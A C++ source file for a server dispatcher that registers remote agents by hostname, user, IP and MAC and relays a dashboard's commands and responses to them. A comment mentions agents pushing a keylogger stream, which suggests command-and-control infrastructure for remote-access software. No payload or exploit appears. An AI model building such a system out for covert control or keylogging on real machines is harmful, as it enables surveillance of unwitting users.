#include "server_dispatcher.hpp"

#include <iostream>
#include <sstream>
#include <stdexcept>

#include "codec/metrics_parser.hpp"
#include "codec/protocol_helper.hpp"
#include "codec/protocol_parser.hpp"
#include "codec/protocol_serializer.hpp"
#include "logger.hpp"
#include "socket/i_socket.hpp"

void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
  AgentConnection& connection = static_cast<AgentConnection&>(agent);
  std::cout << "type = " << static_cast<int>(frame.header.type) << std::endl;

  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(connection, frame.payload);
      break;
    case MessageType::DASHBOARD_REGISTER:
      onDashboardRegister(connection, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(connection, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    case MessageType::DISCONNECT:
      if (sessionManager_.isDashboardConnection(connection.getFd())) {
        // DashboardDisconnect target = ProtocolParser::parseDashboardDisconnect(frame.payload);
        std::string target = ProtocolParser::parseDashboardDisconnect(frame.payload).target;
        onDisconnect(sessionManager_.getAgentByTarget(target));
      } else {
        sendError(connection, ErrorType::UNKNOWN_TYPE,
                  "Agents cannot ask for disconnection");
      }
      break;

      // onDisconnect(connection);
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    case MessageType::COMMAND: {
      if (sessionManager_.isDashboardConnection(connection.getFd())) {
        onDashboardCommand(connection, frame.payload);
      } else {
        sendError(connection, ErrorType::UNKNOWN_TYPE,
                  "Agents send RESPONSE, not COMMAND");
      }
      break;
    }
    default:
      sendError(connection, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void ServerDispatcher::onRegister(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  OsInfoPayload agentInfo = ProtocolParser::parseOsInfoPayload(payload);
  agent.setAgentInfo(agentInfo);
  agent.setIsRegisered();
  // agent.setId(agentInfo.hostname + ":" + agentInfo.ip);
  agent.setId(agentInfo.mac);

  std::ostringstream what;
  what << "[REGISTER] \nhostname : " << agentInfo.hostname
       << "\nuser : " << agentInfo.current_user
       << "\nos : " << static_cast<int>(agentInfo.os_type)
       << "\narch : " << static_cast<int>(agentInfo.arch)
       << "\nversion : " << agentInfo.os_version << "\nip : " << agentInfo.ip
       << "\nmac : " << agentInfo.mac;
  Logger::info("server dispatcher", what.str());

  DataPayload registration;
  registration.subtype = DataType::REGISTRATION;
  registration.data = ProtocolSerializer::serializeOsInfoPayload(agentInfo);
  std::vector<std::uint8_t> registerPayload =
      ProtocolSerializer::serializeDataPayload(registration);
  Frame frame{ProtocolHelper::createHeader(MessageType::DATA, registerPayload),
              registerPayload};

  if (sessionManager_.isDashboard()) {
    try {
      sessionManager_.getDashboard().sendFrame(frame);
    } catch (const std::exception& e) {
      Logger::error(
          "server dispatcher",
          "Failed to send registration to dashboard: " + std::string(e.what()));
    }
  }
}

void ServerDispatcher::onDashboardRegister(
    AgentConnection& dashboard, const std::vector<std::uint8_t>& payload) {
  OsInfoPayload dashboardInfo = ProtocolParser::parseOsInfoPayload(payload);
  dashboard.setAgentInfo(dashboardInfo);
  dashboard.setIsRegisered();
  // dashboard.setId(dashboardInfo.hostname + ":" + dashboardInfo.ip);
  dashboard.setId(dashboardInfo.mac);
  sessionManager_.setDashboardFd(dashboard.getFd());
  sessionManager_.recordAgentTarget(dashboard.getFd(), dashboard.getId());

  Logger::info("server dispatcher",
               "[DASHBOARD REGISTER] : " + dashboard.getId());

  if (sessionManager_.getAgents().empty()) return;
  DataPayload agentsList;
  agentsList.subtype = DataType::AGENTS;
  std::vector<std::uint8_t> dataPayload;

  //  int dashboardFd = dashboard.getFd();
  int dashboardFd = sessionManager_.getDashboardFd();

  for (const auto& entry : sessionManager_.getAgents()) {
    if (entry.first == dashboardFd)
      continue;  // skip dashboard as an agent, dashboardFd can be = -1 at this
                 // point though

    const AgentConnection& agent = entry.second;
    RegisterPayload registration;
    // registration.id = agent.getId();
    registration.system = agent.getAgentInfo();

    std::vector<std::uint8_t> registerPayload =
        ProtocolSerializer::serializeRegisterPayload(registration);
    dataPayload.insert(dataPayload.end(), registerPayload.begin(),
                       registerPayload.end());
  }

  agentsList.data = dataPayload;
  std::vector<std::uint8_t> finalPayload =
      ProtocolSerializer::serializeDataPayload(agentsList);

  Frame frame{ProtocolHelper::createHeader(MessageType::DATA, finalPayload),
              finalPayload};
  dashboard.sendFrame(frame);
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void ServerDispatcher::onResponse(AgentConnection& agent,
                                  const std::vector<std::uint8_t>& payload) {
  std::ostringstream what;
  what << "Response from agent :" << agent.getAgentInfo().ip;
  Logger::info("server dispatcher", what.str());

  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);

  auto it =
      commandTargets_.find(response.id);  // used auto since it is an iterator
  if (it == commandTargets_.end()) {
    Logger::error("server dispatcher", "Unknown command id in response");
    return;
  }

  DashboardResponse dashResponse;
  dashResponse.target = it->second;
  dashResponse.response = response;

  std::vector<std::uint8_t> dashPayload =
      ProtocolSerializer::serializeDashboardResponse(dashResponse);
  Frame frame = {
      ProtocolHelper::createHeader(MessageType::RESPONSE, dashPayload),
      dashPayload};

  if (sessionManager_.isDashboard()) {
    sessionManager_.getDashboard().sendFrame(frame);
  }

  // Clean up when last chunk received
  if (response.chunk_index + 1 == response.total_chunks) {
    commandTargets_.erase(it);
  }
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::ostringstream what;
  what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
  if (data.subtype == DataType::METRICS_SAMPLE) {
    MetricsSample sample = MetricsParser::parseMetricsSample(data.data);

    what << "[DATA] METRICS_SAMPLE\n";

    what << "CPU: " << sample.cpu.total_percent << "%\n";
    what << "CPU cores: ";
    for (float core : sample.cpu.per_core) what << core << "% ";
    what << '\n';

    what << "Memory: " << sample.mem.phys_used << "/" << sample.mem.phys_total
         << " bytes used\n";

    for (const auto& disk : sample.disks) {
      what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
           << " W=" << disk.write_bytes_per_sec << '\n';
    }

    for (const auto& iface : sample.interfaces) {
      what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
           << " TX=" << iface.tx_bytes_per_sec << '\n';
    }
  }
  Logger::info("server dispatcher", what.str());
}

void ServerDispatcher::onDashboardCommand(
    AgentConnection& dashboard, const std::vector<std::uint8_t>& payload) {
  // Parse: target_len + target + CommandPayload
  DashboardCommand commandDashboard =
      ProtocolParser::parseDashboardCommand(payload);

  // Route to agent
  try {
    // int agentFd = sessionManager_.getFdByTarget(commandDashboard.target);
    // AgentConnection& agent = sessionManager_.getAgent(agentFd);
    AgentConnection& agent = sessionManager_.getAgentByTarget(commandDashboard.target);

    // Forward to agent
    sendCommand(agent, commandDashboard.command.type,
                commandDashboard.command.data);

  } catch (const std::exception& e) {
    sendError(dashboard, ErrorType::UNKNOWN_COMMAND,
              "Agent target not found: " + commandDashboard.target);
  }
}

void ServerDispatcher::onDisconnect(AgentConnection& connection) {
  std::ostringstream what;
  what << "[DISCONNECT] " << connection.getId();
  Logger::info("server dispatcher", what.str());
  // maybe handle the rest of pending response and communication before closing
  // anything?
}

// ── Outgoing senders ─────────────────────────────────────────

void ServerDispatcher::sendCommand(AgentConnection& agent, CommandType type,
                                   const std::string& data) {
  if (type == CommandType::UNKNOWN) {
    // sendError(agent, ErrorType::UNKNOWN_COMMAND, "unknown command asked");
    // // throw error here instead, catch it above so we can send it to the
    // right caller! return;
    throw InvalidType(std::to_string(static_cast<int>(type)));
  }

  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);

  Frame frame = {ProtocolHelper::createHeader(MessageType::COMMAND, payload),
                 payload};

  commandTargets_[command.id] = agent.getId();
  agent.sendFrame(frame);
  std::ostringstream what;

  what << "[COMMAND] target=" << agent.getId()
       << "\ntype=" << static_cast<int>(command.type)
       << "\ncmd_id=" << std::to_string(command.id);

  // what << "[COMMAND] id=" << command.id
  // << "  type=" << static_cast<int>(command.type);

  Logger::info("server dispatcher", what.str());
}

void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
  const std::vector<uint8_t> payload{};
  Frame frame = {ProtocolHelper::createHeader(MessageType::DISCONNECT, payload),
                 payload};

  agent.sendFrame(frame);
  Logger::info("server dispatcher", "[DISCONNECT]");
}

std::uint32_t ServerDispatcher::nextId() { return ++nextCmdId_; }

// TODO DASHBOARD SHOULD GET THESE

// void ServerDispatcher::createResponseEntry(const ResponsePayload& response) {
//   if (pendingResponses_.find(response.id) == pendingResponses_.end()) {
//     IncompleteResponse incomplete;
//     incomplete.baseResponse = response;
//     pendingResponses_[response.id] = incomplete;
//   }
// }

// void ServerDispatcher::processCompleteResponse(
//     AgentConnection& agent, const ResponsePayload& response) {
//   std::ostringstream what;
//   what << "[RESPONSE] id=" << response.id
//        << "\nstatus=" << static_cast<int>(response.status)
//        << "\n" << ProtocolParser::toString(response.data);
//   Logger::info("server dispatcher", what.str());

//   // AgentConnection dashboard = sessionManager_.getDashboard();
//   DashboardResponse finalResponse;
//   finalResponse.target = agent.getId();
//   finalResponse.response = response;
//   std::vector<std::uint8_t> payload =
//       ProtocolSerializer::serializeDashboardResponse(finalResponse);
//   Frame frame = {ProtocolHelper::createHeader(MessageType::RESPONSE,
//   payload),
//                  payload};

//   if (sessionManager_.isDashboard()) {
//     try {
//       sessionManager_.getDashboard().sendFrame(frame);
//     } catch (const std::exception& e) {
//       Logger::error(
//           "server dispatcher",
//           "Failed to send registration to dashboard: " +
//           std::string(e.what()));
//     }
//   }

//   if (pendingResponses_.find(response.id) != pendingResponses_.end()) {
//     pendingResponses_.erase(response.id);
//   }
// }

// void ServerDispatcher::tryCompleteResponse(AgentConnection& agent,
//                                            const ResponsePayload& response) {
//   const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
//   if (lastChunk) {
//     IncompleteResponse& incomplete = pendingResponses_[response.id];

//     // Reassemble all chunks
//     ResponsePayload complete = incomplete.baseResponse;
//     complete.data = incomplete.data;

//     processCompleteResponse(agent, complete);
//   }
// }
